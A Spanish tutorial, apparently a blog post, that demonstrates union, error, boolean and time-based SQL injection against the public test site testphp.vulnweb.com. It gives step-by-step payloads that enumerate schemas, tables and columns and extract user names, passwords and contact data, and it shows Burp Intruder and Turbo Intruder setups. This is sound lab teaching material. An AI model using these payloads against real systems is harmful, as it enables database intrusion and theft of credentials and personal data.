<!--Union based, error based: <a href="http://testphp.vulnweb.com/listproducts.php?cat=2" target="_blank">link</a>-->
<!---->
<!--Boolean based, time based: <a href="http://testphp.vulnweb.com/product.php?pic=7" target="_blank">link</a>-->

<br>
<h4 id="Basada en Union">Basada en Union (Union Based)</h4>
<!--Procedimiento-->

Detectando vulnerabilidad:

Payload:

<pre><font class="ej">URL</font> + <font class="bordo">`</font></pre>

![detectando](/assets/img/screens/detectando.png)

<br>
Determinando la cantidad de columnas de la tabla:

Payload:

<pre><font class="ej">URL</font> + <font class="bordo">ORDER BY 10;#</font></pre>

![prueba_1](/assets/img/screens/prueba_1.png)
Es mayor a 10.

<br>
Payload:

<pre><font class="ej">URL</font> + <font class="bordo">ORDER BY 12;#</font></pre>

![prueba_2](/assets/img/screens/prueba_2.png)
Es menor a 12.

<br>
Por lo que parece, esta tabla tiene 11 columnas. Vamos a comprobarlo.

Payload:

<pre><font class="ej">URL</font> + <font class="bordo">ORDER BY 11;#</font></pre>

![prueba_3](/assets/img/screens/prueba_3.png)
Efectivamente, tiene 11 columnas.

<br>
Visualizando bases de datos:

Payload:

<pre><font class="ej">URL</font> + <font class="bordo">UNION SELECT 1,2,3,4,5,6,schema_name,8,9,10,11 FROM information_schema.schemata;#</font></pre>

![v_database](/assets/img/screens/database_1.png)
Devuelve las bases de datos:

. information_schema (metadatos)

. acuart

<br>
Visualizando tablas:

Payload:

<pre><font class="ej">URL</font> + <font class="bordo">UNION SELECT 1,2,3,4,5,6,table_name,8,9,10,11 FROM information_schema.tables WHERE table_schema="acuart";#</font></pre>

![v_tablas](/assets/img/screens/tablas_1.png)

Devuelve las tablas:

. artists

. carts

. categ

. featured

. guestbook

. pictures

. products

. users

<br>
Visualizando columnas de la tabla "users":

Payload:

<pre><font class="ej">URL</font> + <font class="bordo">UNION SELECT 1,2,3,4,5,6,column_name,8,9,10,11 FROM information_schema.columns WHERE table_name="users";#</font></pre>

![v_columnas](/assets/img/screens/columnas_1.png)

Devuelve las columnas:

. address

. cart

. cc

. email

. name

. pass

. phone

. uname

<br>
Extrayendo la información:

Payload:

<pre><font class="ej">URL</font> + <font class="bordo">UNION SELECT 1,2,3,4,5,6,concat(name,':',pass,':',email,':',phone),8,9,10,11 FROM acuart.users;#</font></pre>

![extrayendo](/assets/img/screens/extrayendo_1.png)

<br>
<h4 id="Basada en Error">Basada en Error (Error Based)</h4>
<!--Mostrar procedimiento completo. Dumpear la base de datos actual.-->

Visualizando el nombre de la base de datos actual:

Payload:

<pre><font class="ej">URL</font> + <font class="bordo">UNION SELECT ExtractValue('algo', concat('`', (SELECT database())));#</font></pre>

![v_database](/assets/img/screens/database_2.png)

<br>
Visualizando tablas de la base de datos actual:

Payload:
<!--Burp Suite-->
<pre><font class="ej">URL</font> + <font class="bordo">AND ExtractValue('algo',concat('`', (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT x,1)));#</font></pre>

![v_tablas](/assets/img/screens/tablas_2.png)

<br>
Grep - Extract para tomar de la respuesta la información interesante:

![grep_extract](/assets/img/screens/grep.png)

<br>
Visualizando columnas de la base de datos actual:

Payload:

<pre><font class="ej">URL</font> + <font class="bordo">AND ExtractValue('algo',concat('`', (SELECT column_name FROM information_schema.columns WHERE table_name="users" LIMIT x,1)));#</font></pre>

![v_columnas](/assets/img/screens/columnas_2.png)

<br>
Extrayendo información:

Payload:

<pre><font class="ej">URL</font> + <font class="bordo">AND ExtractValue('algo',concat('`', (SELECT concat(name,',',pass) FROM acuart.users LIMIT 0,1)));#</font></pre>

![extrayendo](/assets/img/screens/extrayendo_2.png)

<br>
<h4>Extensión Turbo Intruder</h4>
Es como el Intruder de Burp Suite pero con nitro.

Esta extensión permite el uso de varias plantillas para llevar a cabo distintos ataques. Es bastante versátil.

Para llevar a cabo una inyección blind es preciso utilizar la plantilla "multipleParameters", la cual requiere de dos diccionarios para 
funcionar. Estos diccionarios, obviamente, son utilizados para reemplazar valores dentro del payload.

* Diccionario 1:<br>
Controla el caracter a extraer en la función substring(). Se compone de números. Varía según la cantidad de caracteres a extraer.<br>
Ej: substring('algo',x,1) (x sería el valor que se sustituye por cada uno del diccionario)

![diccionario1](/assets/img/screens/diccionario1.png)

<br>
* Diccionario 2:<br>
Controla el caracter que se compara con el de la función substring(). Está formado por letras (mayormente) aunque no es mala
idea agregar números y caracteres especiales.<br>
Ej: substring('algo',1,1)='x'

![diccionario2](/assets/img/screens/diccionario2.png)

<br>
Notas:
* Averiguar la cantidad de caracteres a extraer con el Intruder. Usar el ataque Sniper.
* Extraer la información con el Turbo Intruder. Plantilla "multipleParameters".
* Revisar el apartado "length" para saber si un payload fue exitoso o no.<br>
Mayor length = Exitoso<br>
Menor length = No exitoso

<br>
<h4 id="Basada en Booleanos">Basada en Booleanos (Boolean Based)</h4>
<!--Procedimiento completo.-->
<!--Pequeña explicación de las herramientas y pasos utilizados.-->

Averiguando la cantidad de caracteres del nombre de la base de datos actual:

Payload:

<pre><font class="ej">URL</font> + <font class="bordo">AND length(database())=x;#</font></pre>

![averiguando cant. car. de db](/assets/img/screens/av_car_db1.png)

6 caracteres en total.

<br>
"Visualizando" el nombre de la base de datos actual:

Payload:

<pre><font class="ej">URL</font> + <font class="bordo">AND substring(database(),x,1)='x';#</font></pre>

![v_database](/assets/img/screens/database_3.png)

<br>
Averiguando la cantidad de tablas:

Payload:

<pre><font class="ej">URL</font> + <font class="bordo">AND (SELECT count(*) FROM information_schema.tables WHERE table_schema=database())=x;#</font></pre>

![av. cant. tbl](/assets/img/screens/av_cant_tbl1.png)

8 tablas.

<br>
Averiguando la cantidad de caracteres de los nombres de las tablas:

Payload:

<pre><font class="ej">URL</font> + <font class="bordo">AND length((SELECT table_name FROM information_schema.tables WHERE table_schema = "acuart" LIMIT x,1))=x;#</font></pre>

![av. cant. car. de tbl](/assets/img/screens/av_car_tbl1.png)

La cláusula LIMIT recorrió los valores del 0 al 7 debido a que el índice 0 es la primera tabla.<br>
La máxima cantidad de caracteres de las 8 tablas es 9.

<br>
"Visualizando" tablas de la base de datos actual:

Payload:

<pre><font class="ej">URL</font> + <font class="bordo">AND substring((SELECT table_name FROM information_schema.tables WHERE table_schema="acuart" LIMIT n,1),x,1)='x';#</font></pre>

<br>
Tabla 1:
![v_tablas](/assets/img/screens/tablas_3_1.png)
<br>
Tabla 2:
![v_tablas](/assets/img/screens/tablas_3_2.png)
<br>
Tabla 3:
![v_tablas](/assets/img/screens/tablas_3_3.png)
<br>
Tabla 4:
![v_tablas](/assets/img/screens/tablas_3_4.png)
<br>
Tabla 5:
![v_tablas](/assets/img/screens/tablas_3_5.png)
<br>
Tabla 6:
![v_tablas](/assets/img/screens/tablas_3_6.png)
<br>
Tabla 7:
![v_tablas](/assets/img/screens/tablas_3_7.png)
<br>
Tabla 8:
![v_tablas](/assets/img/screens/tablas_3_8.png)

En este caso, solo se puede modificar el valor del índice de la función substring() y el caracter de comparación. La cláusula LIMIT tendrá que
ser usada de forma "manual". Es decir, se tienen que lanzar varios ataques.

<br>
Averiguando la cantidad de columnas:

Payload:

<pre><font class="ej">URL</font> + <font class="bordo">AND (SELECT count(*) FROM information_schema.columns WHERE table_name="users")='x';#</font></pre>	

![av. cant. de col](/assets/img/screens/av_cant_col1.png)

Hay 8 columnas en la tabla "users".

<br>
Averiguando la cantidad de caracteres de las columnas:

Payload:

<pre><font class="ej">URL</font> + <font class="bordo">AND length((SELECT column_name FROM information_schema.columns WHERE table_name="users" LIMIT x,1))='x';#</font></pre>

![av. cant. car. de col](/assets/img/screens/av_car_col1.png)

La máxima cantidad de caracteres es: 7

<!--limit 0-7<br>-->
<!--substring 1-7-->

<br>
"Visualizando" columnas de la base de datos actual:

Payload:

<pre><font class="ej">URL</font> + <font class="bordo">AND substring((SELECT column_name FROM information_schema.columns WHERE table_name="users" LIMIT 0,1),x,1)='x';#</font></pre>

<br>
Columna 1:
![v_columnas](/assets/img/screens/columnas_3_1.png)
<br>
Columna 2:
![v_columnas](/assets/img/screens/columnas_3_2.png)
<br>
Columna 3:
![v_columnas](/assets/img/screens/columnas_3_3.png)
<br>
Columna 4:
![v_columnas](/assets/img/screens/columnas_3_4.png)
<br>
Columna 5:
![v_columnas](/assets/img/screens/columnas_3_5.png)
<br>
Columna 6:
![v_columnas](/assets/img/screens/columnas_3_6.png)
<br>
Columna 7:
![v_columnas](/assets/img/screens/columnas_3_7.png)
<br>
Columna 8:
![v_columnas](/assets/img/screens/columnas_3_8.png)

<br>
Averiguando la cantidad de caracteres de la info. a extraer:

Payload:

<pre><font class="ej">URL</font> + <font class="bordo">AND length((SELECT concat(name,',',pass) FROM acuart.users LIMIT 0,1))=x;#</font></pre>

![av. cant. car. info.](/assets/img/screens/av_car_info1.png)

La cantidad de caracteres de la información a extraer es: 9

<br>
Extrayendo información:

Payload:

<pre><font class="ej">URL</font> + <font class="bordo">AND substring((SELECT concat(name,',',pass) FROM acuart.users LIMIT 0,1),x,1)='x';#</font></pre>

![extrayendo](/assets/img/screens/extrayendo_3.png)

<br>
<h4 id="Basada en Tiempo">Basada en Tiempo (Time Based)</h4>
<!--Procedimiento completo.-->
<!--Pequeña explicación de herramientas y pasos utilizados.-->
<!--burpsuite-->
<!--Explicación de cómo medir el tiempo de respuesta en el Intruder.-->

Voy a usar un sleep de 8 en estos ejemplos.

<br>
Averiguando la cantidad de caracteres del nombre de la base de datos actual:

Payload:

<pre><font class="ej">URL</font> + <font class="bordo">AND IF(length(database())=x,sleep(8),null);#</font></pre>

![av. cant. car. db](/assets/img/screens/av_car_db2.png)

La base de datos tiene una longitud de 6 caracteres.

<br>
"Visualizando" el nombre de la base de datos actual:

Payload:

<pre><font class="ej">URL</font> + <font class="bordo">AND IF(substring(database(),x,1)='x',sleep(8),null);#</font></pre>

![v_database](/assets/img/screens/database_4.png)

1/a 2/c 3/u 4/a 5/r 6/t

<br>
Averiguando la cantidad de tablas:

Payload:

<pre><font class="ej">URL</font> + <font class="bordo">AND IF((SELECT count(*) FROM information_schema.tables WHERE table_schema=database())=x,sleep(8),null);#</font></pre>

![av. cant. de tbl](/assets/img/screens/av_cant_tbl2.png)

Hay un total de 8 tablas en la base de datos actual.

<br>
Averiguando la cantidad de caracteres de los nombres de las tablas:

Payload:

<pre><font class="ej">URL</font> + <font class="bordo">AND IF(length((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT x,1))=x,sleep(8),null);#</font></pre>

![av. cant. car. tbl](/assets/img/screens/av_car_tbl2.png)

La cantidad máxima de caracteres es: 9.

<br>
"Visualizando" tablas de la base de datos actual:

Payload:

<pre><font class="ej">URL</font> + <font class="bordo">AND IF(substring((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT x,1),x,1)='x',sleep(8),null);#</font></pre>

<br>
Tabla 1:
![v_tablas](/assets/img/screens/tablas_4_1.png)

1/a 2/r 3/t 4/i 5/s 6/t 7/s

<br>
Tabla 2:
![v_tablas](/assets/img/screens/tablas_4_2.png)

1/c 2/a 3/r 4/t 5/s

<br>
Tabla 3:
![v_tablas](/assets/img/screens/tablas_4_3.png)

1/c 2/a 3/t 4/e 5/g

<br>
Tabla 4:
![v_tablas](/assets/img/screens/tablas_4_4.png)

1/f 2/e 3/a 4/t 5/u 6/r 7/e 8/d

<br>
Tabla 5:
![v_tablas](/assets/img/screens/tablas_4_5.png)

1/g 2/u 3/e 4/s 5/t 6/b 7/o 8/o 9/k

<br>
Tabla 6:
![v_tablas](/assets/img/screens/tablas_4_6.png)

1/p 2/i 3/c 4/t 5/u 6/r 7/e 8/s

<br>
Tabla 7:
![v_tablas](/assets/img/screens/tablas_4_7.png)

1/p 2/r 3/o 4/d 5/u 6/c 7/t 8/s

<br>
Tabla 8:
![v_tablas](/assets/img/screens/tablas_4_8.png)

1/u 2/s 3/e 4/r 5/s

<br>
Averiguando la cantidad de columnas:

Payload:

<pre><font class="ej">URL</font> + <font class="bordo">AND IF((SELECT count(*) FROM information_schema.columns WHERE table_name="users")=x,sleep(8),null);#</font></pre>

![av. cant. de col](/assets/img/screens/av_cant_col2.png)

Hay 8 columnas en la tabla "users".

<br>
Averiguando la cantidad de caracteres de las columnas:

Payload:

<pre><font class="ej">URL</font> + <font class="bordo">AND IF(length((SELECT column_name FROM information_schema.columns WHERE table_name="users" LIMIT x,1))=x,sleep(8),null);#</font></pre>

![av. cant. car. col](/assets/img/screens/av_car_col2.png)

La máxima cantidad de caracteres es: 9

<br>
"Visualizando" columnas de la base de datos actual:

Payload:

<pre><font class="ej">URL</font> + <font class="bordo">AND IF(substring((SELECT column_name FROM information_schema.columns WHERE table_name="users" LIMIT n,1),x,1)='x',sleep(8),null);#</font></pre>

<br>
Columna 1:
![v_columnas](/assets/img/screens/columnas_4_1.png)

1/u 2/n 3/a 4/m 5/e

<br>
Columna 2:
![v_columnas](/assets/img/screens/columnas_4_2.png)

1/p 2/a 3/s 4/s

<br>
Columna 3:
![v_columnas](/assets/img/screens/columnas_4_3.png)

1/c 2/c

<br>
Columna 4:
![v_columnas](/assets/img/screens/columnas_4_4.png)

1/a 2/d 3/d 4/r 5/e 6/s 7/s

<br>
Columna 5:
![v_columnas](/assets/img/screens/columnas_4_5.png)

1/e 2/m 3/a 4/i 5/l

<br>
Columna 6:
![v_columnas](/assets/img/screens/columnas_4_6.png)

1/n 2/a 3/m 4/e

<br>
Columna 7:
![v_columnas](/assets/img/screens/columnas_4_7.png)

1/p 2/h 3/o 4/n 5/e

<br>
Columna 8:
![v_columnas](/assets/img/screens/columnas_4_8.png)

1/c 2/a 3/r 4/t

<br>
Averiguando la cantidad de caracteres de la info. a extraer:

Payload:

<pre><font class="ej">URL</font> + <font class="bordo">AND IF(length((SELECT concat(name,',',pass) FROM acuart.users LIMIT 0,1))=x,sleep(8),null);#</font></pre>

![av. cant. car. info](/assets/img/screens/av_car_info2.png)

La cantidad de caracteres a extraer es: 9.

<br>
Extrayendo información:

Payload:

<pre><font class="ej">URL</font> + <font class="bordo">AND IF(substring((SELECT concat(name,',',pass) FROM acuart.users LIMIT 0,1),x,1)='x',sleep(8),null);#</font></pre>

![extrayendo](/assets/img/screens/extrayendo_4.png)

1/t 2/e 3/s 4/t 5/, 6/t 7/e 8/s 9/t

<br>

Creo que era más fácil usar SQLmap.
